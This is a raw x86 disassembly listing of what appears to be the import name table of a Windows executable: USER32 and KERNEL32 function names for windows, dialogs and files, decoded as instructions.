  428ed9:	jne    0x428f3d
  428edb:	ins    BYTE PTR es:[edi],dx
  428edc:	gs inc ebx
  428ede:	ins    BYTE PTR es:[edi],dx
  428edf:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428ee6:	add    BYTE PTR [eax],al
  428ee8:	add    WORD PTR [edi+0x65],ax
  428eec:	je     0x428f43
  428eee:	jae    0x428f55
  428ef0:	jb     0x428f41
  428ef2:	bound  ebp,QWORD PTR [edx+0x65]
  428ef5:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428ef9:	outs   dx,WORD PTR ds:[esi]
  428efb:	jb     0x428f6a
  428efd:	popa   
  428efe:	je     0x428f69
  428f00:	outs   dx,DWORD PTR ds:[esi]
  428f01:	outs   dx,BYTE PTR ds:[esi]
  428f02:	push   edi
  428f03:	add    BYTE PTR [eax+0x1],bl
  428f06:	inc    edi
  428f07:	gs je  0x428f5d
  428f0a:	jne    0x428f6e
  428f0c:	dec    ebp
  428f0d:	outs   dx,BYTE PTR gs:[esi]
  428f0f:	jne    0x428f11
  428f11:	add    dh,dh
  428f13:	add    BYTE PTR [edi+0x65],al
  428f16:	je     0x428f5b
  428f18:	ins    BYTE PTR es:[edi],dx
  428f19:	popa   
  428f1a:	jae    0x428f8f
  428f1c:	dec    ecx
  428f1d:	outs   dx,BYTE PTR ds:[esi]
  428f1e:	outs   dx,WORD PTR ds:[esi]
  428f20:	inc    ebp
  428f21:	js     0x428f7a
  428f23:	add    BYTE PTR [ecx+eax*1],cl
  428f26:	inc    edi
  428f27:	gs je  0x428f6e
  428f2a:	gs jae 0x428f98
  428f2d:	je     0x428f9e
  428f2f:	jo     0x428f88
  428f31:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f38:	sub    eax,0x6e655302
  428f3d:	fs dec esi
  428f3f:	outs   dx,DWORD PTR ds:[esi]
  428f40:	je     0x428fab
  428f42:	data16 jns 0x428f92
  428f45:	gs jae 0x428fbb
  428f48:	popa   
  428f49:	addr16 gs push edi
  428f4c:	add    BYTE PTR [eax],al
  428f4e:	and    al,BYTE PTR [edx]
  428f50:	push   ebx
  428f51:	outs   dx,BYTE PTR gs:[esi]
  428f53:	fs inc esp
  428f55:	ins    BYTE PTR es:[edi],dx
  428f56:	addr16 dec ecx
  428f58:	je     0x428fbf
  428f5a:	ins    DWORD PTR es:[edi],dx
  428f5b:	dec    ebp
  428f5c:	gs jae 0x428fd2
  428f5f:	popa   
  428f60:	addr16 gs push edi
  428f63:	add    BYTE PTR [eax],ch
  428f65:	add    DWORD PTR [edi+0x65],eax
  428f68:	je     0x428fb6
  428f6a:	popa   
  428f6b:	jae    0x428fe1
  428f6d:	inc    ecx
  428f6e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428f72:	gs push eax
  428f74:	outs   dx,DWORD PTR ds:[esi]
  428f75:	jo     0x428fec
  428f77:	jo     0x428f79
  428f79:	add    BYTE PTR [ecx],ch
  428f7b:	add    BYTE PTR [ebx+0x68],al
  428f7e:	popa   
  428f7f:	jb     0x428fcd
  428f81:	outs   dx,DWORD PTR ds:[esi]
  428f82:	ja     0x428fe9
  428f84:	jb     0x428fdd
  428f86:	add    BYTE PTR [eax],al
  428f88:	xor    al,BYTE PTR [ecx]
  428f8a:	inc    edi
  428f8b:	gs je  0x428fdb
  428f8e:	outs   dx,BYTE PTR gs:[esi]
  428f90:	jne    0x428fdb
  428f92:	je     0x428ff9
  428f94:	ins    DWORD PTR es:[edi],dx
  428f95:	inc    ebx
  428f96:	outs   dx,DWORD PTR ds:[esi]
  428f97:	jne    0x429007
  428f99:	je     0x428f9b
  428f9b:	add    BYTE PTR ds:0x74655302,bh
  428fa1:	inc    esp
  428fa2:	ins    BYTE PTR es:[edi],dx
  428fa3:	addr16 dec ecx
  428fa5:	je     0x42900c
  428fa7:	ins    DWORD PTR es:[edi],dx
  428fa8:	dec    ecx
  428fa9:	outs   dx,BYTE PTR ds:[esi]
  428faa:	je     0x428fac
  428fac:	mov    al,ds:0x57734901
  428fb1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428fb8:	mov    ds:0x57734901,al
  428fbd:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  428fc4:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  428fcb:	add    DWORD PTR [edi+0x70],ecx
  428fce:	outs   dx,BYTE PTR gs:[esi]
  428fd0:	inc    esp
  428fd1:	gs jae 0x42903f
  428fd4:	je     0x429045
  428fd6:	jo     0x42902f
  428fd8:	add    BYTE PTR [eax],al
  428fda:	cmp    al,BYTE PTR [eax]
  428fdc:	inc    ebx
  428fdd:	push   0x446b6365
  428fe2:	ins    BYTE PTR es:[edi],dx
  428fe3:	addr16 inc edx
  428fe5:	jne    0x42905b
  428fe7:	je     0x429058
  428fe9:	outs   dx,BYTE PTR ds:[esi]
  428fea:	add    BYTE PTR [eax],al
  428fec:	mov    eax,DWORD PTR [ecx]
  428fee:	dec    ecx
  428fef:	outs   dx,BYTE PTR ds:[esi]
  428ff0:	jbe    0x429057
  428ff2:	jb     0x429068
  428ff4:	push   edx
  428ff5:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428ffa:	pop    DWORD PTR [eax]
  428ffc:	inc    esp
  428ffd:	gs push di
  429000:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429007:	outs   dx,DWORD PTR ds:[esi]
  429008:	arpl   WORD PTR [edi+0x0],dx
  42900b:	add    BYTE PTR ds:0x74654701,cl
  429011:	inc    esp
  429012:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429019:	jae    0x429080
  42901b:	push   ebp
  42901c:	outs   dx,BYTE PTR ds:[esi]
  42901d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429025:	gs je  0x42907d
  429028:	jae    0x42908f
  42902a:	jb     0x42907b
  42902c:	bound  ebp,QWORD PTR [edx+0x65]
  42902f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429033:	outs   dx,WORD PTR ds:[esi]
  429035:	jb     0x4290a4
  429037:	popa   
  429038:	je     0x4290a3
  42903a:	outs   dx,DWORD PTR ds:[esi]
  42903b:	outs   dx,BYTE PTR ds:[esi]
  42903c:	inc    ecx
  42903d:	add    BYTE PTR [ecx+0x44734901],bl
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	addr16 inc edx
  429046:	jne    0x4290bc
  429048:	je     0x4290b9
  42904a:	outs   dx,BYTE PTR ds:[esi]
  42904b:	inc    ebx
  42904c:	push   0x656b6365
  429051:	add    BYTE PTR fs:[eax],al
  429054:	ins    DWORD PTR es:[edi],dx
  429055:	add    DWORD PTR [edi+0x65],eax
  429058:	je     0x4290b1
  42905a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  429061:	outs   dx,BYTE PTR ds:[esi]
  429062:	addr16 push edi
  429064:	add    BYTE PTR [eax],al
  429066:	popa   
  429067:	add    BYTE PTR [ebx+0x72],al
  42906a:	gs popa 
  42906c:	je     0x4290d3
  42906e:	push   eax
  42906f:	outs   dx,DWORD PTR ds:[esi]
  429070:	jo     0x4290e7
  429072:	jo     0x4290c1
  429074:	outs   dx,BYTE PTR gs:[esi]
  429076:	jne    0x429078
  429078:	sbb    eax,DWORD PTR [eax]
  42907a:	inc    ebx
  42907b:	popa   
  42907c:	ins    BYTE PTR es:[edi],dx
  42907d:	ins    BYTE PTR es:[edi],dx
  42907e:	push   edi
  42907f:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429086:	outs   dx,DWORD PTR ds:[esi]
  429087:	arpl   WORD PTR [edi+0x0],dx
  42908a:	stos   DWORD PTR es:[edi],eax
  42908b:	add    BYTE PTR [edx+esi*2+0x61],al
  42908f:	ja     0x4290d2
  429091:	outs   dx,BYTE PTR ds:[esi]
  429092:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  429099:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  42909e:	sahf   
  42909f:	add    DWORD PTR [ecx+0x73],ecx
  4290a2:	push   edx
  4290a3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4290a8:	jo     0x42911e
  4290aa:	jns    0x4290ac
  4290ac:	inc    BYTE PTR [eax]
  4290ae:	inc    edi
  4290af:	gs je  0x4290f5
  4290b2:	ins    BYTE PTR es:[edi],dx
  4290b3:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4290ba:	jb     0x4290bc
  4290bc:	lds    eax,FWORD PTR [eax]
  4290be:	inc    ebp
  4290bf:	outs   dx,BYTE PTR ds:[esi]
  4290c0:	fs push eax
  4290c2:	popa   
  4290c3:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  4290ca:	inc    ebp
  4290cb:	outs   dx,BYTE PTR ds:[esi]
  4290cc:	jne    0x42913b
  4290ce:	push   edi
  4290cf:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4290d6:	xchg   DWORD PTR [ecx],eax
  4290d8:	dec    ecx
  4290d9:	outs   dx,BYTE PTR ds:[esi]
  4290da:	je     0x429141
  4290dc:	jb     0x42914c
  4290de:	popa   
  4290df:	ins    BYTE PTR es:[edi],dx
  4290e0:	inc    edi
  4290e1:	gs je  0x42913b
  4290e4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4290eb:	js     0x429161
  4290ed:	add    BYTE PTR [eax+0x43734901],dl
  4290f3:	push   0x6f4c7261
  4290f8:	ja     0x42915f
  4290fa:	jb     0x42913d
  4290fc:	add    BYTE PTR [eax],al
  4290fe:	aad    0x1
  429100:	dec    ebp
  429101:	gs jae 0x429177
  429104:	popa   
  429105:	addr16 gs inc edx
  429108:	outs   dx,DWORD PTR ds:[esi]
  429109:	js     0x429162
  42910b:	add    BYTE PTR [edi+0x636f4c01],bh
  429111:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429115:	outs   dx,DWORD PTR fs:[esi]
  429117:	ja     0x42916e
  429119:	jo     0x42917f
  42911b:	popa   
  42911c:	je     0x429183
  42911e:	add    BYTE PTR [eax],al
  429120:	add    BYTE PTR es:[ebx+0x68],al
  429124:	popa   
  429125:	jb     0x429173
  429127:	outs   dx,DWORD PTR ds:[esi]
  429128:	ja     0x42918f
  42912a:	jb     0x42916d
  42912c:	add    BYTE PTR [eax],al
  42912e:	call   0x6e6f:0x696e5502
  429135:	push   edx
  429136:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42913b:	add    DWORD PTR [edi+0x65],eax
  42913e:	je     0x42918d
  429140:	outs   dx,BYTE PTR gs:[esi]
  429142:	jne    0x429197
  429144:	je     0x4291b8
  429146:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42914d:	add    DWORD PTR [ebp+0x6f],ecx
  429150:	outs   dx,BYTE PTR ds:[esi]
  429151:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  429159:	push   edx
  42915a:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  42915f:	add    dl,BYTE PTR [ebx+0x65]
  429162:	je     0x4291bb
  429164:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42916b:	outs   dx,BYTE PTR ds:[esi]
  42916c:	addr16 inc ecx
  42916e:	add    BYTE PTR [eax],al
  429170:	or     al,0x0
  429172:	inc    edx
  429173:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  42917c:	push   edi
  42917d:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  429184:	jae    0x429186
  429186:	add    BYTE PTR cs:[ebx+0x68],al
  42918a:	popa   
  42918b:	jb     0x4291dd
  42918d:	jb     0x4291f4
  42918f:	jbe    0x4291d2
  429191:	add    bl,bl
  429193:	add    DWORD PTR [ebp+0x6f],ecx
  429196:	jbe    0x4291fd
  429198:	push   edi
  429199:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4291a0:	mov    dh,0x1
  4291a2:	dec    esp
  4291a3:	outs   dx,DWORD PTR ds:[esi]
  4291a4:	popa   
  4291a5:	fs dec ebp
  4291a7:	outs   dx,BYTE PTR gs:[esi]
  4291a9:	jne    0x4291ec
  4291ab:	add    BYTE PTR [ebp+0x79656b02],bh
  4291b1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  4291b5:	jbe    0x42921c
  4291b7:	outs   dx,BYTE PTR ds:[esi]
  4291b8:	je     0x4291ba
  4291ba:	pop    esp
  4291bb:	add    DWORD PTR [edi+0x65],eax
  4291be:	je     0x429213
  4291c0:	jns    0x429235
  4291c2:	je     0x429229
  4291c4:	ins    DWORD PTR es:[edi],dx
  4291c5:	dec    ebp
  4291c6:	gs je  0x42923b
  4291c9:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  4291d0:	dec    esp
  4291d1:	outs   dx,DWORD PTR ds:[esi]
  4291d2:	popa   
  4291d3:	fs dec ecx
  4291d5:	arpl   WORD PTR [edi+0x6e],bp
  4291d8:	inc    ecx
  4291d9:	add    BYTE PTR [ebx+0x1],al
  4291dc:	inc    edi
  4291dd:	gs je  0x42922e
  4291e0:	gs js  0x429257
  4291e3:	inc    esp
  4291e4:	ins    BYTE PTR es:[edi],dx
  4291e5:	addr16 push esp
  4291e7:	popa   
  4291e8:	bound  ecx,QWORD PTR [ecx+0x74]
  4291eb:	gs ins DWORD PTR es:[edi],dx
  4291ed:	add    BYTE PTR [ebx+0x61724400],dh
  4291f3:	ja     0x42923e
  4291f5:	arpl   WORD PTR [edi+0x6e],bp
  4291f8:	add    BYTE PTR [eax],al
  4291fa:	std    
  4291fb:	add    BYTE PTR [edi+0x65],al
  4291fe:	je     0x429243
  429200:	ins    BYTE PTR es:[edi],dx
  429201:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429208:	je     0x42920a
  42920a:	add    DWORD PTR ds:[edi+0x65],eax
  42920e:	je     0x42925d
  429210:	gs jae 0x429286
  429213:	popa   
  429214:	addr16 gs push edi
  429217:	add    BYTE PTR [edx+0x1],al
  42921a:	inc    edi
  42921b:	gs je  0x42926c
  42921e:	gs js  0x429295
  429221:	inc    esp
  429222:	ins    BYTE PTR es:[edi],dx
  429223:	addr16 inc edi
  429225:	jb     0x429296
  429227:	jne    0x429299
  429229:	dec    ecx
  42922a:	je     0x429291
  42922c:	ins    DWORD PTR es:[edi],dx
  42922d:	add    BYTE PTR ds:0x6c655202,dl
  429233:	gs popa 
  429235:	jae    0x42929c
  429237:	inc    esp
  429238:	inc    ebx
  429239:	add    BYTE PTR [ebp+0x53],dl
  42923c:	inc    ebp
  42923d:	push   edx
  42923e:	xor    esi,DWORD PTR [edx]
  429240:	cs fs ins BYTE PTR es:[edi],dx
  429243:	ins    BYTE PTR es:[edi],dx
  429244:	add    BYTE PTR [eax],al
  429246:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42924a:	jbe    0x4292b1
  42924c:	inc    esi
  42924d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  429255:	add    DWORD PTR [esi+0x69],eax
  429258:	outs   dx,BYTE PTR ds:[esi]
  429259:	fs push edx
  42925b:	gs jae 0x4292cd
  42925e:	jne    0x4292d2
  429260:	arpl   WORD PTR [ebp+0x45],sp
  429263:	js     0x4292bc
  429265:	add    BYTE PTR [ebx],dl
  429267:	add    al,0x53
  429269:	gs je  0x4292af
  42926c:	jne    0x4292e0
  42926e:	jb     0x4292d5
  429270:	outs   dx,BYTE PTR ds:[esi]
  429271:	je     0x4292b7
  429273:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42927a:	jns    0x4292bd
  42927c:	add    BYTE PTR [eax],al
  42927e:	sub    BYTE PTR [ebx+edx*2],al
  429281:	gs je  0x4292cc
  429284:	popa   
  429285:	outs   dx,BYTE PTR ds:[esi]
  429286:	fs ins BYTE PTR es:[edi],dx
  429288:	gs inc ebx
  42928a:	outs   dx,DWORD PTR ds:[esi]
  42928b:	jne    0x4292fb
  42928d:	je     0x42928f
  42928f:	add    BYTE PTR [ebx+0x6d6f4300],dh
  429295:	jo     0x4292f8
  429297:	jb     0x4292fe
  429299:	push   ebx
  42929a:	je     0x42930e
  42929c:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  4292a3:	add    DWORD PTR [esi+0x69],eax
  4292a6:	ins    BYTE PTR es:[edi],dx
  4292a7:	gs push esp
  4292a9:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  4292b0:	arpl   WORD PTR [ecx+0x6c],sp
  4292b3:	inc    esi
  4292b4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4292bc:	cmp    eax,DWORD PTR [ebx+edx*2]
  4292bf:	gs je  0x429315
  4292c2:	jns    0x429337
  4292c4:	je     0x42932b
  4292c6:	ins    DWORD PTR es:[edi],dx
  4292c7:	push   esp
  4292c8:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  4292cf:	gs je  0x429313
  4292d2:	inc    ebx
  4292d3:	push   eax
  4292d4:	add    BYTE PTR [eax],al
  4292d6:	arpl   WORD PTR [ecx],ax
  4292d8:	inc    esi
  4292d9:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  4292e0:	je     0x429328
  4292e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  4292ea:	dec    esp
  4292eb:	outs   dx,DWORD PTR ds:[esi]
  4292ec:	popa   
  4292ed:	fs dec esp
  4292ef:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  4292f6:	add    BYTE PTR [eax],al
  4292f8:	push   ss
  4292f9:	add    DWORD PTR [ebp+0x6e],eax
  4292fc:	je     0x429363
  4292fe:	jb     0x429343
  429300:	jb     0x42936b
  429302:	je     0x42936d
  429304:	arpl   WORD PTR [ecx+0x6c],sp
  429307:	push   ebx
  429308:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42930d:	outs   dx,BYTE PTR ds:[esi]
  42930e:	add    BYTE PTR [eax],al
  429310:	cdq    
  429311:	add    DWORD PTR [edi+0x65],eax
  429314:	je     0x429359
  429316:	outs   dx,DWORD PTR ds:[esi]
  429317:	ins    DWORD PTR es:[edi],dx
  429318:	ins    DWORD PTR es:[edi],dx
  429319:	inc    ebx
  42931a:	outs   dx,DWORD PTR ds:[esi]
  42931b:	outs   dx,BYTE PTR ds:[esi]
  42931c:	imul   sp,WORD PTR [edi+0x0],0x188
  429322:	inc    esi
  429323:	jb     0x42938a
  429325:	gs push edx
  429327:	gs jae 0x429399
  42932a:	jne    0x42939e
  42932c:	arpl   WORD PTR [ebp+0x0],sp
  42932f:	add    BYTE PTR [eax+0x1],ah
  429332:	inc    esi
  429333:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42933a:	je     0x429382
  42933c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429344:	inc    edi
  429345:	gs je  0x42938a
  429348:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42934f:	jo     0x4293b6
  429351:	push   edi
  429352:	add    BYTE PTR [eax],al
  429354:	fiadd  WORD PTR [esp+ebp*2]
  429357:	jae    0x4293cd
  429359:	jb     0x4293c7
  42935b:	outs   dx,BYTE PTR gs:[esi]
  42935d:	push   edi
  42935e:	add    BYTE PTR [eax],al
  429360:	pop    ds
  429361:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  429365:	popa   
  429366:	ins    BYTE PTR es:[edi],dx
  429367:	push   ebx
  429368:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  42936f:	gs je  0x4293c5
  429372:	jns    0x4293e7
  429374:	je     0x4293db
  429376:	ins    DWORD PTR es:[edi],dx
  429377:	inc    esp
  429378:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42937f:	jns    0x4293c2
  429381:	add    BYTE PTR [esi+0x74654701],ah
  429387:	inc    ebx
  429388:	outs   dx,DWORD PTR ds:[esi]
  429389:	ins    DWORD PTR es:[edi],dx
  42938a:	jo     0x429401
  42938c:	je     0x4293f3
  42938e:	jb     0x4293de
  429390:	popa   
  429391:	ins    DWORD PTR es:[edi],dx
  429392:	gs push edi
  429394:	add    BYTE PTR [eax],al
  429396:	rol    BYTE PTR [eax],cl
  429398:	inc    ebx
  429399:	jb     0x429400
  42939b:	popa   
  42939c:	je     0x429403
  42939e:	inc    esi
  42939f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4293a7:	outs   dx,BYTE PTR ds:[esi]
  4293a8:	addr16 inc ecx
  4293aa:	add    BYTE PTR [eax],al
  4293ac:	retf   0x4300
  4293af:	jb     0x429416
  4293b1:	popa   
  4293b2:	je     0x429419
  4293b4:	inc    esp
  4293b5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293bc:	jns    0x429415
  4293be:	add    BYTE PTR [eax],al
  4293c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293c1:	add    BYTE PTR [ebx+0x61],al
  4293c4:	outs   dx,BYTE PTR ds:[esi]
  4293c5:	arpl   WORD PTR [ebp+0x6c],sp
  4293c8:	push   edi
  4293c9:	popa   
  4293ca:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4293d2:	ins    DWORD PTR es:[edi],dx
  4293d3:	gs jb  0x4293d6
  4293d6:	add    al,0x2
  4293d8:	inc    edi
  4293d9:	gs je  0x429428
  4293dc:	outs   dx,DWORD PTR ds:[esi]
  4293dd:	arpl   WORD PTR [ecx+0x6c],sp
  4293e0:	gs dec ecx
  4293e2:	outs   dx,BYTE PTR ds:[esi]
  4293e3:	outs   dx,WORD PTR ds:[esi]
  4293e5:	inc    ecx
  4293e6:	add    BYTE PTR [eax],al
  4293e8:	xor    eax,0x766f4d03
  4293ed:	gs inc esi
  4293ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  4293f7:	gs je  0x42943d
  4293fa:	outs   dx,DWORD PTR ds:[esi]
  4293fb:	ins    DWORD PTR es:[edi],dx
  4293fc:	ins    DWORD PTR es:[edi],dx
  4293fd:	push   ebx
  4293fe:	je     0x429461
  429400:	je     0x429467
  429402:	add    BYTE PTR [eax],al
  429404:	mov    ah,0x3
  429406:	push   edx
  429407:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429410:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429418:	ins    BYTE PTR es:[di],dx
  42941a:	gs dec edi
  42941c:	bound  ebp,QWORD PTR [edx+0x65]
  42941f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429423:	add    al,BYTE PTR [edi+0x65]
  429426:	je     0x42947b
  429428:	jns    0x42949d
  42942a:	je     0x429491
  42942c:	ins    DWORD PTR es:[edi],dx
  42942d:	push   esp
  42942e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429435:	jae    0x4294ab
  429437:	ins    DWORD PTR es:[edi],dx
  429438:	outs   dx,BYTE PTR gs:[esi]
  42943a:	je     0x42943c
  42943c:	add    al,0x1
  42943e:	inc    esp
  42943f:	gs ins BYTE PTR es:[edi],dx
  429441:	gs je  0x4294a9
  429444:	inc    esi
  429445:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42944d:	gs je  0x4294a3
  429450:	push   0x5074726f
  429455:	popa   
  429456:	je     0x4294c0
  429458:	dec    esi
  429459:	popa   
  42945a:	ins    DWORD PTR es:[edi],dx
  42945b:	gs inc ecx
  42945d:	add    BYTE PTR [edx],al
  42945f:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  429463:	gs je  0x4294cb
  429466:	inc    ebx
  429467:	jb     0x4294d2
  429469:	je     0x4294d4
  42946b:	arpl   WORD PTR [ecx+0x6c],sp
  42946e:	push   ebx
  42946f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  429474:	outs   dx,BYTE PTR ds:[esi]
  429475:	add    bl,ah
  429477:	add    BYTE PTR [ebx+0x72],al
  42947a:	gs popa 
  42947c:	je     0x4294e3
  42947e:	dec    esi
  42947f:	popa   
  429480:	ins    DWORD PTR es:[edi],dx
  429481:	gs fs push eax
  429484:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  42948b:	add    cl,BYTE PTR [ecx+0x73]
  42948e:	inc    edx
  42948f:	popa   
  429490:	fs push edx
  429492:	gs popa 
  429494:	fs push eax
  429496:	je     0x42950a
  429498:	add    BYTE PTR [eax],al
  42949a:	jnp    0x42949e
  42949c:	inc    edi
  42949d:	gs je  0x4294f5
  4294a0:	jae    0x429507
  4294a2:	jb     0x4294e8
  4294a4:	gs popaw 
  4294a7:	jne    0x429515
  4294a9:	je     0x4294f7
  4294ab:	inc    ebx
  4294ac:	dec    ecx
  4294ad:	inc    esp
  4294ae:	add    BYTE PTR [eax],al
  4294b0:	inc    ebp
  4294b1:	add    al,BYTE PTR [edi+0x65]
  4294b4:	je     0x429506
  4294b6:	jb     0x429527
  4294b8:	arpl   WORD PTR [ecx+0x64],ax
  4294bb:	fs jb  0x429523
  4294be:	jae    0x429533
  4294c0:	add    BYTE PTR [eax],al
  4294c2:	mov    BYTE PTR [ebx],0x52
  4294c5:	gs jae 0x42952d
  4294c8:	je     0x42950f
  4294ca:	jbe    0x429531
  4294cc:	outs   dx,BYTE PTR ds:[esi]
  4294cd:	je     0x4294cf
  4294cf:	add    BYTE PTR [edx+0x656c4300],ch
  4294d5:	popa   
  4294d6:	jb     0x42951b
  4294d8:	outs   dx,DWORD PTR ds:[esi]
  4294d9:	ins    DWORD PTR es:[edi],dx
  4294da:	ins    DWORD PTR es:[edi],dx
  4294db:	inc    ebp
  4294dc:	jb     0x429550
  4294de:	outs   dx,DWORD PTR ds:[esi]
  4294df:	jb     0x4294e1
  4294e1:	add    BYTE PTR [eax+0x61654802],bh
  4294e7:	jo     0x42953e
  4294e9:	outs   dx,BYTE PTR ds:[esi]
  4294ea:	ins    BYTE PTR es:[edi],dx
  4294eb:	outs   dx,DWORD PTR ds:[esi]
  4294ec:	arpl   WORD PTR [ebx+0x0],bp
  4294ef:	add    dh,ch
  4294f1:	add    edx,DWORD PTR [ebx+0x65]
  4294f4:	je     0x429539
  4294f6:	outs   dx,DWORD PTR ds:[esi]
  4294f7:	ins    DWORD PTR es:[edi],dx
  4294f8:	ins    DWORD PTR es:[edi],dx
  4294f9:	push   ebx
  4294fa:	je     0x42955d
  4294fc:	je     0x429563
  4294fe:	add    BYTE PTR [eax],al
  429500:	out    dx,eax
  429501:	add    DWORD PTR [edi+0x65],eax
  429504:	je     0x42954c
  429506:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42950e:	bound  esi,QWORD PTR [ebp+0x74]
  429511:	gs jae 0x429555
  429514:	add    BYTE PTR [eax],al
  429516:	sub    al,0x1
  429518:	inc    ebp
  429519:	outs   dx,BYTE PTR ds:[esi]
  42951a:	jne    0x429589
  42951c:	push   ebx
  42951d:	jns    0x429592
  42951f:	je     0x429586
  429521:	ins    DWORD PTR es:[edi],dx
  429522:	dec    esp
  429523:	outs   dx,DWORD PTR ds:[esi]
  429524:	arpl   WORD PTR [ecx+0x6c],sp
  429527:	gs jae 0x42956b
  42952a:	add    BYTE PTR [eax],al
  42952c:	sub    eax,0x74655304
  429531:	dec    esp
  429532:	outs   dx,DWORD PTR ds:[esi]
  429533:	arpl   WORD PTR [ecx+0x6c],sp
  429536:	push   esp
  429537:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42953e:	inc    ebp
  42953f:	outs   dx,BYTE PTR ds:[esi]
  429540:	jne    0x4295af
  429542:	push   edx
  429543:	gs jae 0x4295b5
  429546:	jne    0x4295ba
  429548:	arpl   WORD PTR [ebp+0x4e],sp
  42954b:	popa   
  42954c:	ins    DWORD PTR es:[edi],dx
  42954d:	gs jae 0x4295a7
  429550:	add    BYTE PTR [eax],al
  429552:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  429559:	gs add BYTE PTR gs:[ebx],ah
  42955d:	add    al,0x53
  42955f:	gs je  0x4295a8
  429562:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  42956a:	gs jb  0x42956d
  42956d:	add    BYTE PTR [edi+0x1],ch
  429570:	inc    esi
  429571:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  429578:	jne    0x4295ec
  42957a:	arpl   WORD PTR [ebp+0x41],sp
  42957d:	add    BYTE PTR ds:0x6c654401,al
  429583:	gs je  0x4295eb
  429586:	inc    esi
  429587:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  42958f:	gs je  0x4295d5
  429592:	outs   dx,DWORD PTR ds:[esi]
  429593:	ins    DWORD PTR es:[edi],dx
  429594:	jo     0x42960b
  429596:	je     0x4295fd
  429598:	jb     0x4295e8
  42959a:	popa   
  42959b:	ins    DWORD PTR es:[edi],dx
  42959c:	gs inc ebp
  42959e:	js     0x4295e1
  4295a0:	add    BYTE PTR [eax],al
  4295a2:	cmp    BYTE PTR [ebx],al
  4295a4:	dec    ebp
  4295a5:	outs   dx,DWORD PTR ds:[esi]
  4295a6:	jbe    0x42960d
  4295a8:	inc    esi
  4295a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  4295b1:	dec    esi
  4295b2:	inc    ebp
  4295b3:	dec    esp
  4295b4:	xor    esi,DWORD PTR [edx]
  4295b6:	cs fs ins BYTE PTR es:[edi],dx
  4295b9:	ins    BYTE PTR es:[edi],dx
  4295ba:	add    BYTE PTR [eax],al
  4295bc:	add    BYTE PTR [eax],al
  4295be:	add    BYTE PTR [eax],al
  4295c0:	xor    ah,BYTE PTR [edx]
  4295c2:	add    al,BYTE PTR [eax]
	...
  4295e0:	sti    
  4295e1:	xchg   ebp,eax
  4295e2:	add    al,BYTE PTR [eax]
	...
